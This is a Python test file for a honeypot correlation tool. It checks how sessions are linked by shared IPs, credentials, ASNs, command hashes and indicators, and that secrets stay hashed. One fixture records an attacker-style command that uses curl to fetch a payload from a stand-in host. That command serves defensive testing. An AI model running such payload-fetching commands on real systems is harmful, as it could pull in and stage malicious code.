from aegis_nexus.correlation_workspace import CORRELATION_SCHEMA_VERSION, CorrelationWorkspace
from aegis_nexus.model import normalize_event
from aegis_nexus.store import Store


def _event(*, timestamp, honeypot, source_ip, service, port, username=None, password=None, command=None, payload=None, asn=None, ioc=None):
    observed = {
        "source_ip": source_ip,
        "service": service,
        "protocol": "tcp",
        "destination_port": port,
    }
    if username is not None:
        observed["credential"] = {"username": username, "password": password or ""}
    if command is not None:
        observed["command"] = command
    if payload is not None:
        observed["payload"] = payload
    enrichment = {}
    if asn:
        enrichment["asn"] = {
            "source": "fixture",
            "observed_at": timestamp,
            "data": {"asn": asn},
        }
    derived = {}
    if ioc:
        derived["ioc"] = [{"type": ioc[0], "value": ioc[1], "evidence": ["fixture"]}]
    return normalize_event({
        "timestamp": timestamp,
        "honeypot": honeypot,
        "event_type": "credential" if username is not None else "command",
        "observed": observed,
        "enrichment": enrichment,
        "derived": derived,
    })


def test_cross_session_correlation_is_explainable_and_not_attribution(tmp_path):
    path = str(tmp_path / "aegis.db")
    store = Store(path)
    target = store.ingest(_event(
        timestamp="2026-09-23T10:00:00Z",
        honeypot="ssh-1",
        source_ip="203.0.113.10",
        service="ssh",
        port=22,
        username="admin",
        password="first-secret",
        asn="AS64500",
    ))
    related = store.ingest(_event(
        timestamp="2026-09-23T10:05:00Z",
        honeypot="web-1",
        source_ip="203.0.113.10",
        service="http",
        port=80,
        username="admin",
        password="different-secret",
        asn="AS64500",
    ))

    result = CorrelationWorkspace(path).analyze(target["session_id"], hours=24)
    assert result["schema_version"] == CORRELATION_SCHEMA_VERSION
    item = next(entry for entry in result["items"] if entry["session_id"] == related["session_id"])
    features = {basis["feature"] for basis in item["evidence_basis"]}
    assert {"source_ip", "username", "asn"} <= features
    assert item["method"] == "evidence_overlap_v1"
    assert item["score"] >= 0.90
    assert item["strength"] == "strong"
    assert item["attribution"] is False
    assert result["analysis"]["attribution_inferred"] is False
    assert "not attribution probability" in result["analysis"]["score_semantics"]


def test_credential_correlation_uses_fingerprint_without_exposing_secret(tmp_path):
    path = str(tmp_path / "aegis.db")
    store = Store(path)
    target = store.ingest(_event(
        timestamp="2026-09-23T11:00:00Z",
        honeypot="ssh-1",
        source_ip="203.0.113.20",
        service="ssh",
        port=22,
        username="root",
        password="same-secret",
    ))
    related = store.ingest(_event(
        timestamp="2026-09-23T11:10:00Z",
        honeypot="ssh-2",
        source_ip="203.0.113.21",
        service="ssh",
        port=2222,
        username="operator",
        password="same-secret",
    ))

    result = CorrelationWorkspace(path).analyze(target["session_id"], hours=24)
    item = next(entry for entry in result["items"] if entry["session_id"] == related["session_id"])
    fingerprint = next(
        basis for basis in item["evidence_basis"]
        if basis["feature"] == "credential_secret_fingerprint"
    )
    assert fingerprint["value"].startswith("sha256:")
    assert "same-secret" not in str(result)
    assert item["score"] >= 0.85


def test_ioc_command_payload_port_service_and_asn_features_are_supported(tmp_path):
    path = str(tmp_path / "aegis.db")
    store = Store(path)
    target = store.ingest(_event(
        timestamp="2026-09-23T12:00:00Z",
        honeypot="web-1",
        source_ip="203.0.113.30",
        service="http",
        port=8080,
        command="curl https://payload.example.invalid/a",
        payload="marker=alpha",
        asn="AS64510",
        ioc=("domain", "payload.example.invalid"),
    ))
    related = store.ingest(_event(
        timestamp="2026-09-23T12:20:00Z",
        honeypot="web-2",
        source_ip="203.0.113.31",
        service="http",
        port=8080,
        command="curl https://payload.example.invalid/a",
        payload="marker=alpha",
        asn="AS64510",
        ioc=("domain", "payload.example.invalid"),
    ))

    result = CorrelationWorkspace(path).analyze(target["session_id"], hours=24)
    item = next(entry for entry in result["items"] if entry["session_id"] == related["session_id"])
    features = {basis["feature"] for basis in item["evidence_basis"]}
    assert {
        "command_sha256",
        "payload_sha256",
        "ioc",
        "destination_port",
        "service",
        "asn",
    } <= features
    assert all("payload.example.invalid/a" not in basis["value"] for basis in item["evidence_basis"] if basis["feature"] == "command_sha256")


def test_weak_port_and_service_overlap_is_filtered_by_default(tmp_path):
    path = str(tmp_path / "aegis.db")
    store = Store(path)
    target = store.ingest(_event(
        timestamp="2026-09-23T13:00:00Z",
        honeypot="web-1",
        source_ip="203.0.113.40",
        service="http",
        port=80,
    ))
    unrelated = store.ingest(_event(
        timestamp="2026-09-23T13:30:00Z",
        honeypot="web-2",
        source_ip="203.0.113.41",
        service="http",
        port=80,
    ))

    result = CorrelationWorkspace(path).analyze(target["session_id"], hours=24)
    assert all(item["session_id"] != unrelated["session_id"] for item in result["items"])
